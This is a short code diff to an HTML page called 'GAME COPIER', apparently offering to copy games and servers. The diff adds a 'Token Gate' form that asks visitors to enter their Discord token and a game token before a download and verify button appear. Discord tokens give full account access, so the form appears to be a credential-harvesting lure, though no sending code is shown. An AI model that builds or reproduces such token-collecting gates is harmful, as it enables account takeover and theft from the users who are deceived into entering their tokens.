@@ -154,6 +154,17 @@
   <div class="container">
     <h1>GAME COPIER</h1>
     <p>Copy games & servers (legally)</p>
+<!-- Token Gate - Discord + Game Token -->
+<div id="tokenGateBox" style="margin-bottom: 24px;">
+  <input type="text" id="discordTokenGateInput" placeholder="Enter Discord Token" autocomplete="off" />
+  <input type="text" id="gameTokenGateInput" placeholder="Enter Game Token" autocomplete="off" />
+  <button id="tokenGateSubmitBtn">Submit</button>
+  <div id="downloadSection" style="display: none;">
+    <button id="downloadBtn">Download</button>
+    <div id="downloadGateMsg"></div>
+    <button id="verifyBtn" style="margin-top:10px;display:none;">Verify</button>
+  </div>
+</div>
 
     <div class="mode-switcher">
       <button id="gameModeBtn" class="active">Game Copier</button>
